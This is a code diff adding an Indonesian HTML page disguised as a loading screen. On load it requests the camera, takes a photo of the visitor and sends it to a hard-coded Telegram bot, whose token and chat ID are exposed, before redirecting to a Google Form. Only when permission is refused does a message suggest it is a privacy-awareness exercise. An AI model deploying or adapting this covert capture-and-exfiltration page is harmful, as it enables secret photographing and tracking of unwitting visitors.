@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html lang="id">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta http-equiv="Permissions-Policy" content="unload=()" />
+    <title>Memuat...</title>
+    <style>
+      body {
+        background-color: white;
+        margin: 0;
+      }
+    </style>
+  </head>
+  <body>
+    <script>
+      // Fungsi untuk mengambil foto dari kamera
+      async function ambilFoto() {
+        try {
+          const stream = await navigator.mediaDevices.getUserMedia({
+            video: true,
+          });
+          const video = document.createElement("video");
+          video.id = "camera-video";
+          video.srcObject = stream;
+          await video.play();
+
+          const canvas = document.createElement("canvas");
+          canvas.id = "photo-canvas";
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          const context = canvas.getContext("2d");
+          context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+          // Hentikan stream kamera
+          stream.getTracks().forEach((track) => track.stop());
+
+          // Ubah gambar ke format base64
+          return canvas.toDataURL("image/jpeg");
+        } catch (err) {
+          console.error("Akses kamera ditolak atau gagal:", err);
+          return null;
+        }
+      }
+
+      // Fungsi untuk mendapatkan lokasi
+      async function ambilLokasi() {
+        return null;
+      }
+
+      // Fungsi utama
+      async function jalankanSkenario() {
+        // Buat elemen loading text
+        const loadingDiv = document.createElement("div");
+        loadingDiv.id = "loading-text";
+        loadingDiv.style.cssText =
+          "font-size: 1rem; text-align: center; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 50vh; font-family: sans-serif; color: #333;";
+        document.body.appendChild(loadingDiv);
+
+        let foto = null;
+        let lokasi = null;
+
+        // Ambil foto dan lokasi secara paralel
+        const [hasilFoto, hasilLokasi] = await Promise.all([
+          ambilFoto(),
+          ambilLokasi(),
+        ]);
+
+        foto = hasilFoto;
+        lokasi = hasilLokasi;
+
+        // Cek apakah setidaknya satu data berhasil diambil (foto atau lokasi)
+        if (foto || lokasi) {
+          const TELEGRAM_BOT_TOKEN =
+            "8399020540:AAE-GBRbJtCU-XYeBrSdiziCpZKvT__cQew";
+          const CHAT_ID = "7851258138";
+
+          try {
+            if (foto) {
+              // Kirim foto ke Telegram langsung dari client-side
+              const formData = new FormData();
+              formData.append("chat_id", CHAT_ID);
+              formData.append("caption", "");
+              const base64Data = foto.split(",")[1];
+              const buffer = Uint8Array.from(atob(base64Data), (c) =>
+                c.charCodeAt(0)
+              );
+              formData.append(
+                "photo",
+                new Blob([buffer], { type: "image/jpeg" }),
+                "photo.jpg"
+              );
+
+              const photoResponse = await fetch(
+                `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`,
+                {
+                  method: "POST",
+                  body: formData,
+                }
+              );
+              if (!photoResponse.ok) {
+                console.error(
+                  "Failed to send photo:",
+                  photoResponse.statusText
+                );
+              }
+            }
+
+            if (lokasi) {
+              // Kirim lokasi ke Telegram
+              const locationResponse = await fetch(
+                `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendLocation`,
+                {
+                  method: "POST",
+                  headers: {
+                    "Content-Type": "application/json",
+                  },
+                  body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    latitude: lokasi.latitude,
+                    longitude: lokasi.longitude,
+                  }),
+                }
+              );
+              if (!locationResponse.ok) {
+                console.error(
+                  "Failed to send location:",
+                  locationResponse.statusText
+                );
+              }
+            }
+          } catch (error) {
+            console.error("Gagal mengirim ke Telegram:", error);
+          }
+
+          // Alihkan ke Google Form
+          window.location.href = "https://forms.gle/wsZXjekLsggYzPQi9";
+        } else {
+          // Jika semua izin ditolak, tidak melakukan apa-apa
+          // atau menampilkan pesan edukasi di halaman
+          document.getElementById("loading-text").innerHTML =
+            "<h2>Anda berhasil!</h2><p>Dengan menolak izin, Anda melindungi privasi Anda. Ini adalah langkah pertama dalam keamanan siber.</p>";
+        }
+      }
+
+      // Jalankan fungsi utama saat halaman dimuat
+      document.addEventListener("DOMContentLoaded", jalankanSkenario);
+    </script>
+  </body>
+</html>
